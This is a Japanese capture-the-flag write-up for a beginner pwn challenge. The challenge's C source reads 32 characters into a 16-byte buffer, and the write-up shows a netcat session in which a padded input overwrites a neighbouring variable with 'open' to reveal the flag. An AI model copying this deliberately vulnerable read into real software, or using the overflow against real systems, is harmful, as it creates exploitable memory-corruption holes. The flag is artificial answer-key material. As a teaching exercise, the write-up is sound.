# tkys_let_die:Pwn:100pts
瑠璃色の扉を有する荘厳な門が目の前にあった。めずらしく後輩が家に招待してくれるというので訪問することにしたあなた。うちの家は特別に許可を受けた人物でないと入れないもので。後輩はそういうとすみませんねと静かに門を閉じる。招かれても許可はもらえていないのか。どうやら後輩の家に入るにはこの門を自力で突破する必要がありそうです。  
添付されたファイルを解析し、以下にアクセスしてフラグを入手してください。  
`nc 10.1.1.10 13020`  
この設問では Linux ターミナルを使用します。  
[https://ctf.setodanote.net/webshell/](https://ctf.setodanote.net/webshell/)  
[tkys_let_die_4dde194173f42fd04abbfa52459b1dfba8c1b682.zip](tkys_let_die_4dde194173f42fd04abbfa52459b1dfba8c1b682.zip)  

# Solution
配布されたソースは以下のようだった。  
```C
~~~
int main(void) {
    char gate[6]="close";
    char name[16]="..";
~~~
    printf("You'll need permission to pass. What's your name?\n> ");
    scanf("%32[^\n]", name);
    if (strcmp(gate,"open")==0) {
        printFlag();
    }else{
        printf("Gate is %s.\n", gate);
        printf("Goodbay %s.\n", name);
    }
~~~
```
BOFで`close`を`open`に書き換えればよい。  
指定されたターミナルを使用する。  
```bash
user@90dd92a1842e:~$ nc 10.1.1.10 13020

                                  {} {}
                          !  !  ! II II !  !  !
                       !  I__I__I_II II_I__I__I  !
                       I_/|__|__|_|| ||_|__|__|\_I
                    ! /|_/|  |  | || || |  |  |\_|\ !
        .--.        I//|  |  |  | || || |  |  |  |\\I        .--.
       /-   \    ! /|/ |  |  |  | || || |  |  |  | \|\ !    /=   \
       \=__ /    I//|  |  |  |  | || || |  |  |  |  |\\I    \-__ /
        }  {  ! /|/ |  |  |  |  | || || |  |  |  |  | \|\ !  }  {
       {____} I//|  |  |  |  |  | || || |  |  |  |  |  |\\I {____}
 _!__!__|= |=/|/ |  |  |  |  |  | || || |  |  |  |  |  | \|\=|  |__!__!_
 _I__I__|  ||/|__|__|__|__|__|__|_|| ||_|__|__|__|__|__|__|\||- |__I__I_
 -|--|--|- ||-|--|--|--|--|--|--|-|| ||-|--|--|--|--|--|--|-||= |--|--|-
  |  |  |  || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||  |  |  |
  |  |  |= || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||- |  |  |
 _|__|__|  ||_|__|__|__|__|__|__|_|| ||_|__|__|__|__|__|__|_||  |__|__|_
 -|--|--|= ||-|--|--|--|--|--|--|-|| ||-|--|--|--|--|--|--|-||- |--|--|-
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
 ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

You'll need permission to pass. What's your name?
> 1234567890qwertyuiopasdfghjklzxcvbnm
Gate is jklzxc.
Goodbay 1234567890qwertyuiopasdfghjklzxc.


user@90dd92a1842e:~$ nc 10.1.1.10 13020
~~~
You'll need permission to pass. What's your name?
> aaaaaaaaaaaaaaaaaaaaaaaaaaopen

 =============================

     GREAT! GATE IS OPEN!!

 >> Flag is flag{Alohomora} <<

    *-*-*-*-*-*-*-*-*-*-*-*   

 =============================
```

## flag{Alohomora}